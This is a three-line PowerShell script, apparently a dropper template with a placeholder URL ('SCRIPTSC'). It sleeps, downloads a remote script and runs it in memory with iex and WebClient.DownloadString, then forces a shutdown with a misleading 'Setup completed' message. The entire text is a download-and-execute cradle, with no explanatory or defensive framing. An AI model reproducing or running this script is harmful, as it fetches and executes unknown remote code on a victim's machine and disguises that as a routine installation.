Start-Sleep -s 30
iex ((New-Object System.Net.WebClient).DownloadString('SCRIPTSC'))
& shutdown /s /c "Setup completed" /t 3
